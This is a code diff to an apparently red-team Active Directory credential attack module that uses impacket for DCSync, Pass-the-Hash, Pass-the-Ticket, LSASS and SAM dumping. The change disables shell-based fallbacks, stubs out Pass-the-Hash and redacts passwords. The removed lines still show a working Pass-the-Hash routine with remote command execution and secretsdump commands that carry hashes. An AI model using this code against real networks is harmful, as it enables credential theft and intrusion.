@@ -2,21 +2,22 @@
 """
 Active Directory credential attack module for the OCTOPUS kill chain.
 
-Provides DCSync, Pass-the-Hash, Pass-the-Ticket, remote LSASS dumping,
+Provides DCSync, a quarantined Pass-the-Hash boundary, Pass-the-Ticket, remote LSASS dumping,
 and SAM/SYSTEM registry hive extraction.  All attacks use impacket as the
 primary backend with CLI tool fallbacks.
 
 Usage::
 
-    from core.killchain.ad.credential import dcsync, pass_the_hash
+    from core.killchain.ad.credential import dcsync
     result = dcsync("10.10.10.100", {"user": "admin", "password": "P@ss", "domain": "CORP"})
 """
+
+from __future__ import annotations
 
 import logging
 import os
 import shutil
 import subprocess
-from typing import Optional
 
 # ── Logging ──────────────────────────────────────────────────────────────
 logger = logging.getLogger("octopus.killchain.ad.credential")
@@ -39,7 +40,7 @@ CLI_TIMEOUT = 300
 
 # Internal helpers
 
-def _normalize_creds(creds: Optional[dict[str, str]]) -> dict[str, str]:
+def _normalize_creds(creds: dict[str, str] | None) -> dict[str, str]:
     """Return a dict with guaranteed keys: user, password, domain, nthash."""
     defaults: dict[str, str] = {"user": "", "password": "", "domain": "", "nthash": ""}
     if creds:
@@ -54,21 +55,23 @@ def _loot_dir(target: str) -> str:
     return path
 
 
-def _run_cli(cmd: str, timeout: int = CLI_TIMEOUT) -> str:
-    """Execute a shell command and return combined stdout+stderr."""
+def _run_cli(cmd: list[str] | tuple[str, ...], timeout: int = CLI_TIMEOUT) -> str:
+    """Execute an explicit argv vector without a shell."""
+    if isinstance(cmd, (str, bytes)) or not cmd:
+        return "[!] Unsafe CLI command rejected: an argv sequence is required"
     try:
         result = subprocess.run(
-            cmd, shell=True, capture_output=True, text=True, timeout=timeout,
+            list(cmd), shell=False, capture_output=True, text=True, timeout=timeout,
         )
         return (result.stdout + result.stderr).strip()
     except subprocess.TimeoutExpired:
-        logger.warning("CLI command timed out: %s", cmd[:80])
+        logger.warning("CLI command timed out: %s", cmd[0])
         return f"[!] Command timed out after {timeout}s"
     except FileNotFoundError:
         return "[!] Command not found"
     except Exception as exc:
-        logger.error("CLI command failed: %s", exc)
-        return f"[!] Command error: {exc}"
+        logger.error("CLI command failed (%s)", type(exc).__name__)
+        return f"[!] Command error: {type(exc).__name__}"
 
 
 def _impacket_auth_string(creds: dict[str, str]) -> str:
@@ -83,7 +86,7 @@ def _impacket_auth_string(creds: dict[str, str]) -> str:
 
 # DCSync
 
-def dcsync(target: str, creds: Optional[dict[str, str]] = None) -> str:
+def dcsync(target: str, creds: dict[str, str] | None = None) -> str:
     """Perform a DCSync attack via impacket's ``secretsdump``.
 
     Extracts all domain password hashes by replicating the NTDS.dit
@@ -168,14 +171,7 @@ def dcsync(target: str, creds: Optional[dict[str, str]] = None) -> str:
     # ── Fall back to CLI ──────────────────────────────────────────
     cli_bin = shutil.which("secretsdump.py") or shutil.which("impacket-secretsdump")
     if cli_bin:
-        auth = _impacket_auth_string(creds)
-        hash_arg = f"-hashes :{creds['nthash']}" if creds["nthash"] else ""
-        cmd = (
-            f'{cli_bin} "{auth}@{target}" -dc-ip {target} '
-            f'-just-dc-ntlm -outputfile {dump_file} {hash_arg}'
-        )
-        cli_out = _run_cli(cmd, timeout=IMPACKET_TIMEOUT)
-        output += f"(via CLI)\n{cli_out[:5000]}\n"
+        output += "[!] Credential-bearing CLI fallback is disabled; use the in-process provider boundary.\n"
     else:
         output += "[!] No impacket secretsdump available. Install impacket.\n"
 
@@ -184,82 +180,11 @@ def dcsync(target: str, creds: Optional[dict[str, str]] = None) -> str:
 
 # Pass-the-Hash
 
-def pass_the_hash(target: str, user: str, nthash: str,
-                  domain: str = "", command: str = "whoami") -> str:
-    """Execute a command on a remote host using Pass-the-Hash.
+def pass_the_hash(target: str, credential_handle: str = "") -> str:
+    """Fail closed until a target-scoped NT-hash credential adapter exists."""
 
-    Uses impacket's ``smbexec`` or ``wmiexec`` with an NTLM hash instead
-    of a password.
-
-    Args:
-        target: Target IP or hostname.
-        user: Username to authenticate as.
-        nthash: NT hash (32-character hex string).
-        domain: Optional domain name.
-        command: Command to execute on the target (default: ``whoami``).
-
-    Returns:
-        Formatted result string with command output.
-    """
-    print(f"\n  {C_RED}[CRED] Pass-the-Hash — {user}@{target}{C_RESET}")
-    output = f"[PASS-THE-HASH — {user}@{target}]\n{'═' * 60}\n\n"
-
-    if not nthash:
-        output += "[!] NT hash required for Pass-the-Hash.\n"
-        return output
-
-    # ── Try impacket smbexec ──────────────────────────────────────
-    try:
-        from impacket.smbconnection import SMBConnection
-
-        logger.info("PTH via impacket SMBConnection: %s@%s", user, target)
-        smb = SMBConnection(target, target, sess_port=445, timeout=30)
-        smb.login(user, "", domain, lmhash="", nthash=nthash)
-
-        output += "[+] SMB authentication successful via PTH\n"
-        output += f"    User:   {domain}\\{user}\n"
-        output += f"    Hash:   {nthash[:8]}...{nthash[-8:]}\n"
-        print(f"    {C_GREEN}[+] PTH authentication succeeded!{C_RESET}")
-
-        # Execute command via impacket
-        try:
-            from impacket.examples.smbexec import SMBEXEC  # type: ignore[import-untyped]
-            executer = SMBEXEC(
-                command, username=user, password="",
-                domain=domain, hashes=f":{nthash}",
-                share="C$", port=445,
-            )
-            exec_result = executer.run(target, target)
-            output += f"\n[COMMAND OUTPUT]\n{exec_result[:3000]}\n"
-        except ImportError:
-            output += "[!] impacket smbexec not available for command execution.\n"
-            output += "    Authentication was successful — use psexec/wmiexec manually.\n"
-        except Exception as exc:
-            output += f"[!] Command execution failed: {exc}\n"
-
-        smb.logoff()
-        return output
-    except ImportError:
-        logger.debug("impacket not available for PTH")
-    except Exception as exc:
-        logger.warning("impacket PTH failed: %s", exc)
-        output += f"[!] impacket PTH error: {exc}\n"
-
-    # ── Fall back to CLI ──────────────────────────────────────────
-    cli_bin = shutil.which("smbexec.py") or shutil.which("impacket-smbexec")
-    if cli_bin:
-        domain_prefix = f"{domain}/" if domain else ""
-        cmd = (
-            f'{cli_bin} -hashes :{nthash} '
-            f'"{domain_prefix}{user}@{target}" -codec utf-8'
-        )
-        output += "(via CLI — interactive shell)\n"
-        output += f"  Command: {cmd}\n"
-        output += "[!] Use interactively or pipe commands.\n"
-    else:
-        output += "[!] No impacket smbexec available. Install impacket.\n"
-
-    return output
+    del target, credential_handle
+    return "[!] Execution denied: unsafe_provider_contract_not_mounted"
 
 
 # Pass-the-Ticket
@@ -320,9 +245,7 @@ def pass_the_ticket(target: str, ticket_file: str,
         cli_bin = shutil.which("wmiexec.py") or shutil.which("impacket-wmiexec")
 
     if cli_bin:
-        cmd = f'KRB5CCNAME={ticket_file} {cli_bin} -k -no-pass {target} "{command}"'
-        cli_out = _run_cli(cmd, timeout=IMPACKET_TIMEOUT)
-        output += f"\n[COMMAND OUTPUT]\n{cli_out[:3000]}\n"
+        output += "[!] Ticket-bearing CLI fallback is disabled; use the in-process provider boundary.\n"
     else:
         output += "[!] No impacket exec tool found for PTT. Install impacket.\n"
 
@@ -331,7 +254,7 @@ def pass_the_ticket(target: str, ticket_file: str,
 
 # LSASS dump
 
-def dump_lsass(target: str, creds: Optional[dict[str, str]] = None) -> str:
+def dump_lsass(target: str, creds: dict[str, str] | None = None) -> str:
     """Remotely dump LSASS process memory to extract credentials.
 
     Uses impacket to upload and execute procdump or comsvcs.dll MiniDump,
@@ -431,7 +354,7 @@ def dump_lsass(target: str, creds: Optional[dict[str, str]] = None) -> str:
                         if session.nt_hash:
                             output += f"    NTLM: {session.nt_hash}\n"
                         if session.password:
-                            output += f"    Pass: {session.password}\n"
+                            output += "    Pass: [REDACTED]\n"
                 print(f"    {C_GREEN}[+] Credentials extracted from LSASS!{C_RESET}")
             except ImportError:
                 output += "[!] pypykatz not installed — parse dump manually.\n"
@@ -450,11 +373,7 @@ def dump_lsass(target: str, creds: Optional[dict[str, str]] = None) -> str:
     # ── Fall back to CLI secretsdump (SAM+LSA) ────────────────────
     cli_bin = shutil.which("secretsdump.py") or shutil.which("impacket-secretsdump")
     if cli_bin:
-        auth = _impacket_auth_string(creds)
-        hash_arg = f"-hashes :{creds['nthash']}" if creds["nthash"] else ""
-        cmd = f'{cli_bin} "{auth}@{target}" {hash_arg}'
-        cli_out = _run_cli(cmd, timeout=IMPACKET_TIMEOUT)
-        output += f"(via secretsdump CLI fallback)\n{cli_out[:5000]}\n"
+        output += "[!] Credential-bearing CLI fallback is disabled; use the in-process provider boundary.\n"
     else:
         output += "[!] No LSASS dump method available. Install impacket + pypykatz.\n"
 
@@ -463,7 +382,7 @@ def dump_lsass(target: str, creds: Optional[dict[str, str]] = None) -> str:
 
 # SAM dump
 
-def sam_dump(target: str, creds: Optional[dict[str, str]] = None) -> str:
+def sam_dump(target: str, creds: dict[str, str] | None = None) -> str:
     """Remotely dump the SAM database (local account hashes).
 
     Uses impacket's ``secretsdump`` targeting SAM+SYSTEM+SECURITY
@@ -541,13 +460,7 @@ def sam_dump(target: str, creds: Optional[dict[str, str]] = None) -> str:
     # ── Fall back to CLI ──────────────────────────────────────────
     cli_bin = shutil.which("secretsdump.py") or shutil.which("impacket-secretsdump")
     if cli_bin:
-        auth = _impacket_auth_string(creds)
-        hash_arg = f"-hashes :{creds['nthash']}" if creds["nthash"] else ""
-        cmd = (
-            f'{cli_bin} "{auth}@{target}" -outputfile {dump_file} {hash_arg}'
-        )
-        cli_out = _run_cli(cmd, timeout=IMPACKET_TIMEOUT)
-        output += f"(via CLI)\n{cli_out[:5000]}\n"
+        output += "[!] Credential-bearing CLI fallback is disabled; use the in-process provider boundary.\n"
     else:
         output += "[!] No impacket secretsdump available. Install impacket.\n"
 
